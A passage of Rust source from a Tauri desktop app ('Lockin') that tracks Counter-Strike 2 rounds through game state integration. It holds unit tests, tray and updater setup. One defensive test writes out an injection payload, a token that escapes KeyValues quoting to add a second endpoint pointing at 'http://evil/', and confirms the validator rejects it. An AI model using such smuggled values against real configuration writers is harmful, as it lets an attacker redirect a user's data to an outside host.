        let rec = track_round(&mut tr, &payload("over", 8, 63, 800, 3600, 2), true).unwrap();
        assert_eq!(rec["died"], serde_json::json!(false));
        assert_eq!(rec["deathMs"], serde_json::Value::Null);
    }

    #[test]
    fn the_buy_is_read_when_the_round_goes_live_not_during_freezetime() {
        // during freezetime money is still moving as you buy; the number that means anything is
        // what you walked out of spawn holding.
        let mut tr = RoundTracker::default();
        track_round(&mut tr, &payload("freezetime", 9, 100, 5000, 0, 0), true);
        track_round(&mut tr, &payload("live", 9, 100, 1150, 4200, 0), true);
        let rec = track_round(&mut tr, &payload("over", 10, 100, 1150, 4200, 0), true).unwrap();
        assert_eq!(rec["buyMoney"], serde_json::json!(1150));
        assert_eq!(rec["buyEquip"], serde_json::json!(4200));
    }

    #[test]
    fn a_round_never_seen_live_emits_nothing() {
        // joining mid-round, or a warmup "over", must not invent a record with a null clock
        let mut tr = RoundTracker::default();
        assert!(track_round(&mut tr, &payload("over", 12, 100, 800, 3600, 0), true).is_none());
    }

    // The audit's exact scenario, and the one the original design could never pass: you die
    // mid-round, CS2 switches your player block to the team-mate you are now spectating, and
    // the round ENDS while you are still dead. Gating the whole state machine on is_self meant
    // the "over" edge arrived on a spectated payload, was never seen, and the round vanished —
    // so the feature recorded zero deaths, forever, while every test stayed green.
    // The token goes verbatim into a KeyValues file. A backup can carry any string here —
    // validBackup only ever inspected sessions and plan — so a quote plus a newline closes our
    // block and opens a second one, handing CS2 a second GSI endpoint pointed anywhere. The
    // frontend now re-mints anything malformed, but the frontend is the replaceable half.
    #[test]
    fn a_token_that_could_escape_the_keyvalues_quoting_is_refused() {
        let good = "a1b2c3d4e5f60718293a4b5c6d7e8f90";
        assert!(gsi_token_ok(good), "32 lowercase hex is what randToken mints");
        // the actual attack shape from the audit
        assert!(!gsi_token_ok("a\"\n}\n\"Exfil\"\n{\n\"uri\" \"http://evil/\"\n"));
        assert!(!gsi_token_ok(""), "empty");
        assert!(!gsi_token_ok("a1b2c3d4e5f60718293a4b5c6d7e8f9"), "31 chars");
        assert!(!gsi_token_ok("a1b2c3d4e5f60718293a4b5c6d7e8f900"), "33 chars");
        assert!(!gsi_token_ok("A1B2C3D4E5F60718293A4B5C6D7E8F90"), "uppercase is not our shape");
        assert!(!gsi_token_ok("a1b2c3d4e5f60718293a4b5c6d7e8f9g"), "non-hex");
        assert!(!gsi_token_ok("a1b2c3d4-e5f6-0718-293a-4b5c6d7e"), "hyphens");
    }

    // A refused token must also never reach the file: assert the body only ever contains a
    // token we would accept, so the guard cannot be bypassed by a future caller.
    #[test]
    fn the_written_cfg_carries_only_a_well_formed_token() {
        let body = gsi_config_body("a1b2c3d4e5f60718293a4b5c6d7e8f90", 3121);
        assert!(body.contains("\"token\" \"a1b2c3d4e5f60718293a4b5c6d7e8f90\""));
        // one block, one uri — a second of either means something escaped the quoting
        assert_eq!(body.matches("\"uri\"").count(), 1);
        assert_eq!(body.matches("127.0.0.1").count(), 1);
    }

    #[test]
    fn dying_and_then_spectating_still_records_the_round() {
        let mut tr = RoundTracker::default();
        track_round(&mut tr, &payload("freezetime", 5, 100, 5000, 0, 0), true);
        track_round(&mut tr, &payload("live", 5, 100, 800, 3600, 0), true);
        track_round(&mut tr, &payload("live", 5, 0, 650, 3600, 1), true); // I die
        // from here CS2 describes the team-mate I am spectating, not me
        let mut spec = payload("live", 5, 87, 2400, 4100, 3);
        spec["player"]["steamid"] = serde_json::json!("76561198000000999");
        track_round(&mut tr, &spec, false);
        let mut spec_over = payload("over", 6, 87, 2400, 4100, 3);
        spec_over["player"]["steamid"] = serde_json::json!("76561198000000999");
        let rec = track_round(&mut tr, &spec_over, false)
            .expect("the round must still be recorded when it ends while I am spectating");
        assert_eq!(rec["died"], serde_json::json!(true), "I died in this round");
        assert_eq!(rec["roundKills"], serde_json::json!(1), "my kills, not the spectated player's 3");
        assert_eq!(rec["leftOver"], serde_json::json!(650), "my money, not the spectated player's 2400");
        assert_eq!(rec["won"], serde_json::json!(false), "my team CT vs win_team T");
    }

    // When your death IS the round-ending event, CS2 coalesces health->0 and phase->over into
    // one payload. A phase=="live" gate on the death check dropped exactly those — the
    // last-alive deaths, which are the most informative ones the audit is looking for.
    #[test]
    fn a_death_that_ends_the_round_is_still_a_death() {
        let mut tr = RoundTracker::default();
        track_round(&mut tr, &payload("live", 8, 100, 800, 3600, 0), true);
        let rec = track_round(&mut tr, &payload("over", 9, 0, 300, 3600, 2), true).unwrap();
        assert_eq!(rec["died"], serde_json::json!(true), "health 0 on the over edge is a death");
        assert!(rec["deathMs"].as_u64().is_some(), "and it must carry a time");
    }

    #[test]
    fn spectating_a_team_mate_is_not_me() {
        let mut v = payload("live", 4, 100, 800, 3600, 0);
        v["player"]["steamid"] = serde_json::json!("76561198000000999");
        assert!(!gsi_is_self(&v), "a different steamid is someone else's round");
        assert!(gsi_is_self(&payload("live", 4, 100, 800, 3600, 0)));
    }

    #[test]
    fn win_is_null_rather_than_false_when_the_teams_are_unknown() {
        let mut tr = RoundTracker::default();
        let mut live = payload("live", 2, 100, 800, 3600, 0);
        live["player"]["team"] = serde_json::json!("");
        track_round(&mut tr, &live, true);
        let mut over = payload("over", 3, 100, 800, 3600, 0);
        over["player"]["team"] = serde_json::json!("");
        let rec = track_round(&mut tr, &over, true).unwrap();
        assert_eq!(rec["won"], serde_json::Value::Null, "unknown must never read as a loss");
    }

    // Sampled from a real cs2_user_convars_0_slot0.vcfg so the key names and the tab-quote
    // shape are the ones CS2 actually writes, not ones I assumed.
    const CONVARS: &str = "\t\t\"cl_crosshair_drawoutline\"\t\t\"true\"\n\
                           \t\t\"cl_crosshair_dynamic_splitdist\"\t\t\"7\"\n\
                           \t\t\"cl_crosshairdot\"\t\t\"true\"\n\
                           \t\t\"cl_crosshairgap\"\t\t\"-3\"\n\
                           \t\t\"cl_crosshairsize\"\t\t\"2\"\n\
                           \t\t\"cl_crosshairstyle\"\t\t\"4\"\n\
                           \t\t\"sensitivity\"\t\t\"1.28\"\n\
                           \t\t\"zoom_sensitivity_ratio\"\t\t\"1\"\n";
    const VIDEO: &str = "\t\"setting.defaultres\"\t\t\"1440\"\n\
                         \t\"setting.defaultresheight\"\t\t\"1440\"\n\
                         \t\"setting.fullscreen\"\t\t\"1\"\n";

    #[test]
    fn reads_the_convars_cs2_actually_writes() {
        assert_eq!(quoted_after(CONVARS, "\"cl_crosshairstyle\""), Some("4".into()));
        assert_eq!(quoted_after(CONVARS, "\"cl_crosshairsize\""), Some("2".into()));
        assert_eq!(quoted_after(CONVARS, "\"cl_crosshairdot\""), Some("true".into()));
        assert_eq!(quoted_after(CONVARS, "\"cl_crosshair_drawoutline\""), Some("true".into()));
        // `sensitivity` must not be captured from `zoom_sensitivity_ratio`
        assert_eq!(quoted_after(CONVARS, "\"sensitivity\""), Some("1.28".into()));
        assert_eq!(quoted_after(CONVARS, "\"m_rawinput\""), None);
    }

    #[test]
    fn defaultres_is_not_captured_from_defaultresheight() {
        // both keys share a prefix; the quoted form is what keeps them apart
        assert_eq!(quoted_after(VIDEO, "\"setting.defaultres\""), Some("1440".into()));
        assert_eq!(quoted_after(VIDEO, "\"setting.defaultresheight\""), Some("1440".into()));
        assert_eq!(quoted_after(VIDEO, "\"setting.fullscreen\""), Some("1".into()));
    }

    #[test]
    fn a_missing_key_reads_as_absent_rather_than_empty() {
        assert_eq!(quoted_after(VIDEO, "\"setting.nonexistent\""), None);
        assert_eq!(quoted_after("", "\"sensitivity\""), None);
    }

    #[test]
    fn gsi_result_covers_win_loss_tie_and_unknown() {
        // the higher score wins for whichever side the player is on; flip the side, flip the result.
        assert_eq!(gsi_result(16, 13, "CT"), "win");
        assert_eq!(gsi_result(13, 16, "CT"), "loss");
        assert_eq!(gsi_result(16, 13, "T"), "loss");
        assert_eq!(gsi_result(13, 16, "T"), "win");
        assert_eq!(gsi_result(15, 15, "CT"), "tie");
        // no player side (spectator / missing field) => never counted against the stop-loss
        assert_eq!(gsi_result(16, 5, ""), "unknown");
        assert_eq!(gsi_result(16, 5, "SPECTATOR"), "unknown");
    }

    #[test]
    fn gsi_config_body_targets_our_endpoint_with_token_and_balanced_braces() {
        let cfg = gsi_config_body("deadbeef", 3121);
        assert!(cfg.contains("\"uri\" \"http://127.0.0.1:3121/\""));
        assert!(cfg.contains("\"token\" \"deadbeef\""));
        assert!(cfg.contains("\"player_match_stats\" \"1\""));
        // the KeyValues braces must balance or CS2 rejects the file
        assert_eq!(cfg.matches('{').count(), cfg.matches('}').count());
    }
}

// Enable/disable launch-at-login so the tray app is around to deliver reminders.
#[tauri::command]
fn set_autostart(app: tauri::AppHandle, enabled: bool) -> Result<(), String> {
    let m = app.autolaunch();
    if enabled {
        m.enable().map_err(|e| e.to_string())
    } else {
        m.disable().map_err(|e| e.to_string())
    }
}

// Is a newer release published? Returns Some(version) or None. Wrapped as an app command so the
// frontend needs no plugin ACL (same pattern as notify/set_autostart).
#[tauri::command]
async fn check_update(app: tauri::AppHandle) -> Result<Option<String>, String> {
    let updater = app.updater().map_err(|e| e.to_string())?;
    let found = updater.check().await.map_err(|e| e.to_string())?;
    Ok(found.map(|u| u.version))
}

// Download + install the pending update, then relaunch into the new version.
#[tauri::command]
async fn install_update(app: tauri::AppHandle) -> Result<(), String> {
    let updater = app.updater().map_err(|e| e.to_string())?;
    if let Some(update) = updater.check().await.map_err(|e| e.to_string())? {
        update
            .download_and_install(|_chunk, _total| {}, || {})
            .await
            .map_err(|e| e.to_string())?;
        app.restart();
    }
    Ok(())
}

fn show_main(app: &tauri::AppHandle) {
    if let Some(w) = app.get_webview_window("main") {
        let _ = w.show();
        let _ = w.unminimize();
        let _ = w.set_focus();
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        // single-instance MUST be registered first: a second launch (autostart + manual) focuses
        // the running window instead of spawning a duplicate tray icon / webview / reminder timer.
        .plugin(tauri_plugin_single_instance::init(|app, _argv, _cwd| {
            show_main(app);
        }))
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_notification::init())
        .plugin(tauri_plugin_autostart::init(MacosLauncher::LaunchAgent, None))
        .plugin(tauri_plugin_updater::Builder::new().build())
        .invoke_handler(tauri::generate_handler![
            notify,
            set_autostart,
            check_update,
            install_update,
            open_url,
            scan_workshop,
            backup_write,
            backup_read,
            backup_delete,
            read_cs_config,
            start_gsi,
            write_gsi_config
        ])
        .setup(|app| {
            let show = MenuItem::with_id(app, "show", "Open Lockin", true, None::<&str>)?;
            let quit = MenuItem::with_id(app, "quit", "Quit", true, None::<&str>)?;
            let menu = Menu::with_items(app, &[&show, &quit])?;
            let mut tb = TrayIconBuilder::new()
                .menu(&menu)
                .on_menu_event(|app, event| match event.id.as_ref() {
                    "show" => show_main(app),
                    "quit" => app.exit(0),
                    _ => {}
                })
                // only a completed left-click opens the window — right-click still just opens the
                // context menu (was: any Click fired, so right-click popped the window too).
                .on_tray_icon_event(|tray, event| {
                    if let TrayIconEvent::Click {
                        button: MouseButton::Left,
                        button_state: MouseButtonState::Up,
                        ..
                    } = event
                    {
                        show_main(tray.app_handle());
                    }
                });
            // guard the icon so a missing embedded icon can't panic startup before any window shows
            if let Some(icon) = app.default_window_icon() {
                tb = tb.icon(icon.clone());
            }
            tb.build(app)?;

            // SELF-HEAL: early desktop builds registered a service worker at tauri.localhost.
            // Being cache-first, it then served that old app forever — surviving every reinstall,
            // and refusing to serve the very code that stopped registering it. The frontend can't
            // escape that on its own, so break the loop from the native side: unregister any SW,
            // drop its caches, and reload into the real bundled app. No-ops on a clean install,
            // and never touches localStorage, so streaks and plans are preserved.
            if let Some(w) = app.get_webview_window("main") {
                let _ = w.eval(
                    "(function(){try{if(!navigator.serviceWorker)return;\
navigator.serviceWorker.getRegistrations().then(function(rs){\
if(!rs.length)return;\
Promise.all(rs.map(function(r){return r.unregister();}))\
.then(function(){return caches.keys();})\
.then(function(ks){return Promise.all(ks.map(function(k){return caches.delete(k);}));})\
.then(function(){location.reload(true);});});}catch(e){}})()",
                );
            }
            Ok(())
        })
        // Closing the window hides it to the tray (so the reminder timer keeps running).
        .on_window_event(|window, event| {
            if let WindowEvent::CloseRequested { api, .. } = event {
                let _ = window.hide();
                api.prevent_close();
            }
        })
        .run(tauri::generate_context!())
        .expect("error while running Lockin");
}
